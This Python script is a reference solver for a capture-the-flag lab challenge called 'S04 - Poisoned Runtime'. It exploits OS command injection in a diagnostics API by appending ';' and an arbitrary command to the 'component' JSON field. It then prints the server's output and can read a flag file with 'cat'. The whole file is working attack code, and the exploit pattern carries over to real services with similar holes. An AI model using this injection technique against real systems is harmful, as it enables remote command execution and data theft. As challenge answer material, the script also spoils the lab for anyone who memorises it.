#!/usr/bin/env python3
"""
S04 - Poisoned Runtime
Reference solver for the intended solution path.
Authorized use only inside the isolated Operation Poisoned Pipeline lab.
"""

import argparse
import json
import re
import sys
import urllib.error
import urllib.request

DEFAULT_TARGET = "http://nexora-app:5000"
DIAGNOSTICS_PATH = "/api/diagnostics/run"
DEFAULT_FLAG_PATH = "/opt/nexora/private/s04_flag.txt"

FLAG_PATTERN = re.compile(r"IE3132\{PP_S04_[0-9a-f]{32}\}")


def post_json(url, payload, timeout=20):
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        status = response.status
        body = response.read().decode("utf-8")
        return status, json.loads(body)


def run_command(target, command, timeout=20):
    url = target.strip("/") + DIAGNOSTICS_PATH
    payload = {
        "component": "nexora-utils;" + command,
        "verbose": True,
    }

    print(f"[+] POST {url}")
    print(f"[+] Injected command: {command}")

    try:
        status, body = post_json(url, payload, timeout=timeout)
    except urllib.error.HTTPError as exc:
        print(f"[ERROR] HTTP error: {exc.code} {exc.reason}")
        sys.exit(1)
    except urllib.error.URLError as exc:
        print(f"[ERROR] Connection failed: {exc.reason}")
        print(f"       Target: {url}")
        sys.exit(1)

    print(f"[+] HTTP status: {status}")

    stdout = body.get("stdout", "")
    stderr = body.get("stderr", "")

    if stdout:
        print("[+] Server stdout:")
        for line in stdout.rstrip().splitlines():
            print(f"    {line}")

    if stderr:
        print("[+] Server stderr:")
        for line in stderr.rstrip().splitlines():
            print(f"    {line}")

    return body


def main():
    parser = argparse.ArgumentParser(
        description="S04 - Poisoned Runtime reference solver"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--command",
        default="id",
        help="Command to run as pipeline-app (default: id)",
    )
    parser.add_argument(
        "--read-flag",
        action="store_true",
        help="Run the intended flag-reading path",
    )
    parser.add_argument(
        "--flag-path",
        default=DEFAULT_FLAG_PATH,
        help=f"Flag file path (default: {DEFAULT_FLAG_PATH})",
    )
    args = parser.parse_args()

    print("=" * 60)
    print(" S04 - Poisoned Runtime Solver")
    print("=" * 60)
    print()

    if args.read_flag:
        command = f"cat {args.flag_path}"
    else:
        command = args.command

    body = run_command(args.target, command)

    if args.read_flag:
        stdout = body.get("stdout", "")
        match = FLAG_PATTERN.search(stdout)
        if match:
            print()
            print("[+] S04 flag recovered:")
            print(f"    {match.group(0)}")
            print()
            print("[+] Submit this token to CTFd.")
        else:
            print()
            print("[!] Flag pattern not found in stdout.")
            print("[!] Check the flag file path and permissions.")
            sys.exit(1)

    print()
    print("=" * 60)
    print(" S04 solve complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
